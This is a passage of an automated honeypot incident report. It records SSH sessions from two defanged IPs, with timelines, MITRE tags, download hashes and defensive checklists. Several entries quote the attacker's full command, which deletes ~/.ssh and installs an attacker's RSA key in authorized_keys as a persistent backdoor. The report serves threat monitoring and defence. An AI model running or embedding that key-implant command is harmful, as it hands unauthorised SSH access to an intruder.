| `2026-04-06 10:32:44` | `cowrie.command.failed` |
| `2026-04-06 10:32:44` | `cowrie.log.closed` |
| `2026-04-06 10:32:44` | `cowrie.session.params` |
| `2026-04-06 10:32:44` | `cowrie.command.input` |
| `2026-04-06 10:32:45` | `cowrie.session.file_download` |
| `2026-04-06 10:32:45` | `cowrie.log.closed` |
| `2026-04-06 10:32:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06694bfb4173

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-06 10:32 |
| **Last Seen** | 2026-04-06 10:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:32:47` | `cowrie.session.connect` |
| `2026-04-06 10:32:47` | `cowrie.client.version` |
| `2026-04-06 10:32:47` | `cowrie.client.kex` |
| `2026-04-06 10:32:47` | `cowrie.login.success` |
| `2026-04-06 10:32:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-233c9873aafb

| Field | Detail |
|---|---|
| **Source IP** | `14.248.82[.]58` |
| **First Seen** | 2026-04-06 10:32 |
| **Last Seen** | 2026-04-06 10:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:32:59` | `cowrie.session.connect` |
| `2026-04-06 10:32:59` | `cowrie.client.version` |
| `2026-04-06 10:32:59` | `cowrie.client.kex` |
| `2026-04-06 10:32:59` | `cowrie.login.success` |
| `2026-04-06 10:33:00` | `cowrie.session.params` |
| `2026-04-06 10:33:00` | `cowrie.command.input` |
| `2026-04-06 10:33:00` | `cowrie.command.failed` |
| `2026-04-06 10:33:00` | `cowrie.log.closed` |
| `2026-04-06 10:33:00` | `cowrie.session.params` |
| `2026-04-06 10:33:00` | `cowrie.command.input` |
| `2026-04-06 10:33:00` | `cowrie.session.file_download` |
| `2026-04-06 10:33:00` | `cowrie.log.closed` |
| `2026-04-06 10:33:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.82[.]58` to AbuseIPDB if not already reported
- [ ] Block `14.248.82[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56c9c20a6247

| Field | Detail |
|---|---|
| **Source IP** | `14.248.82[.]58` |
| **First Seen** | 2026-04-06 10:33 |
| **Last Seen** | 2026-04-06 10:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:33:02` | `cowrie.session.connect` |
| `2026-04-06 10:33:02` | `cowrie.client.version` |
| `2026-04-06 10:33:02` | `cowrie.client.kex` |
| `2026-04-06 10:33:03` | `cowrie.login.success` |
| `2026-04-06 10:33:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.82[.]58` to AbuseIPDB if not already reported
- [ ] Block `14.248.82[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10015db62790

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-06 10:35 |
| **Last Seen** | 2026-04-06 10:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:35:32` | `cowrie.session.connect` |
| `2026-04-06 10:35:32` | `cowrie.client.version` |
| `2026-04-06 10:35:33` | `cowrie.client.kex` |
| `2026-04-06 10:35:33` | `cowrie.login.success` |
| `2026-04-06 10:35:33` | `cowrie.session.params` |
| `2026-04-06 10:35:33` | `cowrie.command.input` |
| `2026-04-06 10:35:33` | `cowrie.command.failed` |
| `2026-04-06 10:35:34` | `cowrie.log.closed` |
| `2026-04-06 10:35:34` | `cowrie.session.params` |
| `2026-04-06 10:35:34` | `cowrie.command.input` |
| `2026-04-06 10:35:34` | `cowrie.session.file_download` |
| `2026-04-06 10:35:34` | `cowrie.log.closed` |
| `2026-04-06 10:35:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf75365a3ba5

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-06 10:35 |
| **Last Seen** | 2026-04-06 10:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:35:36` | `cowrie.session.connect` |
| `2026-04-06 10:35:36` | `cowrie.client.version` |
| `2026-04-06 10:35:36` | `cowrie.client.kex` |
| `2026-04-06 10:35:37` | `cowrie.login.success` |
| `2026-04-06 10:35:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c8ae0a444a1

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-06 10:37 |
| **Last Seen** | 2026-04-06 10:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:37:00` | `cowrie.session.connect` |
| `2026-04-06 10:37:00` | `cowrie.client.version` |
| `2026-04-06 10:37:00` | `cowrie.client.kex` |
| `2026-04-06 10:37:00` | `cowrie.login.success` |
| `2026-04-06 10:37:01` | `cowrie.session.params` |
| `2026-04-06 10:37:01` | `cowrie.command.input` |
| `2026-04-06 10:37:01` | `cowrie.command.failed` |
| `2026-04-06 10:37:01` | `cowrie.log.closed` |
| `2026-04-06 10:37:01` | `cowrie.session.params` |
| `2026-04-06 10:37:01` | `cowrie.command.input` |
| `2026-04-06 10:37:01` | `cowrie.session.file_download` |
| `2026-04-06 10:37:01` | `cowrie.log.closed` |
| `2026-04-06 10:37:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea20cad1f20d

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-06 10:37 |
| **Last Seen** | 2026-04-06 10:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:37:04` | `cowrie.session.connect` |
| `2026-04-06 10:37:04` | `cowrie.client.version` |
| `2026-04-06 10:37:04` | `cowrie.client.kex` |
| `2026-04-06 10:37:04` | `cowrie.login.success` |
| `2026-04-06 10:37:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-897a8e94e5a6

| Field | Detail |
|---|---|
| **Source IP** | `14.248.82[.]58` |
| **First Seen** | 2026-04-06 10:38 |
| **Last Seen** | 2026-04-06 10:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:38:10` | `cowrie.session.connect` |
| `2026-04-06 10:38:10` | `cowrie.client.version` |
| `2026-04-06 10:38:10` | `cowrie.client.kex` |
| `2026-04-06 10:38:10` | `cowrie.login.success` |
| `2026-04-06 10:38:11` | `cowrie.session.params` |
| `2026-04-06 10:38:11` | `cowrie.command.input` |
| `2026-04-06 10:38:11` | `cowrie.command.failed` |
| `2026-04-06 10:38:11` | `cowrie.log.closed` |
| `2026-04-06 10:38:11` | `cowrie.session.params` |
| `2026-04-06 10:38:11` | `cowrie.command.input` |
| `2026-04-06 10:38:11` | `cowrie.session.file_download` |
| `2026-04-06 10:38:11` | `cowrie.log.closed` |
| `2026-04-06 10:38:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.82[.]58` to AbuseIPDB if not already reported
- [ ] Block `14.248.82[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2674b07db5e

| Field | Detail |
|---|---|
| **Source IP** | `14.248.82[.]58` |
| **First Seen** | 2026-04-06 10:38 |
| **Last Seen** | 2026-04-06 10:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:38:13` | `cowrie.session.connect` |
| `2026-04-06 10:38:13` | `cowrie.client.version` |
| `2026-04-06 10:38:13` | `cowrie.client.kex` |
| `2026-04-06 10:38:14` | `cowrie.login.success` |
| `2026-04-06 10:38:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.82[.]58` to AbuseIPDB if not already reported
- [ ] Block `14.248.82[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-143ff585df82

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-06 10:38 |
| **Last Seen** | 2026-04-06 10:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:38:25` | `cowrie.session.connect` |
| `2026-04-06 10:38:25` | `cowrie.client.version` |
| `2026-04-06 10:38:26` | `cowrie.client.kex` |
| `2026-04-06 10:38:26` | `cowrie.login.success` |
| `2026-04-06 10:38:26` | `cowrie.session.params` |
| `2026-04-06 10:38:26` | `cowrie.command.input` |
| `2026-04-06 10:38:26` | `cowrie.command.failed` |
| `2026-04-06 10:38:27` | `cowrie.log.closed` |
| `2026-04-06 10:38:27` | `cowrie.session.params` |
| `2026-04-06 10:38:27` | `cowrie.command.input` |
| `2026-04-06 10:38:27` | `cowrie.session.file_download` |
| `2026-04-06 10:38:27` | `cowrie.log.closed` |
| `2026-04-06 10:38:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffc645e180b2

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-06 10:38 |
| **Last Seen** | 2026-04-06 10:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:38:29` | `cowrie.session.connect` |
| `2026-04-06 10:38:29` | `cowrie.client.version` |
| `2026-04-06 10:38:29` | `cowrie.client.kex` |
| `2026-04-06 10:38:30` | `cowrie.login.success` |
| `2026-04-06 10:38:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9bc3ce3854a

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-06 10:41 |
| **Last Seen** | 2026-04-06 10:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:41:23` | `cowrie.session.connect` |
| `2026-04-06 10:41:23` | `cowrie.client.version` |
| `2026-04-06 10:41:23` | `cowrie.client.kex` |
| `2026-04-06 10:41:23` | `cowrie.login.success` |
| `2026-04-06 10:41:24` | `cowrie.session.params` |
| `2026-04-06 10:41:24` | `cowrie.command.input` |
| `2026-04-06 10:41:24` | `cowrie.command.failed` |
| `2026-04-06 10:41:24` | `cowrie.log.closed` |
| `2026-04-06 10:41:24` | `cowrie.session.params` |
| `2026-04-06 10:41:24` | `cowrie.command.input` |
| `2026-04-06 10:41:24` | `cowrie.session.file_download` |
| `2026-04-06 10:41:24` | `cowrie.log.closed` |
| `2026-04-06 10:41:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f82682348e4d

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-06 10:41 |
| **Last Seen** | 2026-04-06 10:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:41:26` | `cowrie.session.connect` |
| `2026-04-06 10:41:26` | `cowrie.client.version` |
| `2026-04-06 10:41:27` | `cowrie.client.kex` |
| `2026-04-06 10:41:27` | `cowrie.login.success` |
| `2026-04-06 10:41:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a019e5d7fe9f

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-06 10:42 |
| **Last Seen** | 2026-04-06 10:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:42:54` | `cowrie.session.connect` |
| `2026-04-06 10:42:54` | `cowrie.client.version` |
| `2026-04-06 10:42:54` | `cowrie.client.kex` |
| `2026-04-06 10:42:54` | `cowrie.login.success` |
| `2026-04-06 10:42:55` | `cowrie.session.params` |
| `2026-04-06 10:42:55` | `cowrie.command.input` |
| `2026-04-06 10:42:55` | `cowrie.command.failed` |
| `2026-04-06 10:42:55` | `cowrie.log.closed` |
| `2026-04-06 10:42:55` | `cowrie.session.params` |
| `2026-04-06 10:42:55` | `cowrie.command.input` |
| `2026-04-06 10:42:55` | `cowrie.session.file_download` |
| `2026-04-06 10:42:55` | `cowrie.log.closed` |
| `2026-04-06 10:42:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b0294714a3e

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-06 10:42 |
| **Last Seen** | 2026-04-06 10:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:42:57` | `cowrie.session.connect` |
| `2026-04-06 10:42:57` | `cowrie.client.version` |
| `2026-04-06 10:42:58` | `cowrie.client.kex` |
| `2026-04-06 10:42:58` | `cowrie.login.success` |
| `2026-04-06 10:42:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5db79e2c380a

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-06 10:44 |
| **Last Seen** | 2026-04-06 10:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:44:19` | `cowrie.session.connect` |
| `2026-04-06 10:44:19` | `cowrie.client.version` |
| `2026-04-06 10:44:19` | `cowrie.client.kex` |
| `2026-04-06 10:44:20` | `cowrie.login.success` |
| `2026-04-06 10:44:20` | `cowrie.session.params` |
| `2026-04-06 10:44:20` | `cowrie.command.input` |
| `2026-04-06 10:44:20` | `cowrie.command.failed` |
| `2026-04-06 10:44:20` | `cowrie.log.closed` |
| `2026-04-06 10:44:20` | `cowrie.session.params` |
| `2026-04-06 10:44:20` | `cowrie.command.input` |
| `2026-04-06 10:44:21` | `cowrie.session.file_download` |
| `2026-04-06 10:44:21` | `cowrie.log.closed` |
| `2026-04-06 10:44:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9eaa0f95d99

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-06 10:44 |
| **Last Seen** | 2026-04-06 10:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:44:23` | `cowrie.session.connect` |
| `2026-04-06 10:44:23` | `cowrie.client.version` |
| `2026-04-06 10:44:23` | `cowrie.client.kex` |
| `2026-04-06 10:44:23` | `cowrie.login.success` |
| `2026-04-06 10:44:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7ac01a47017

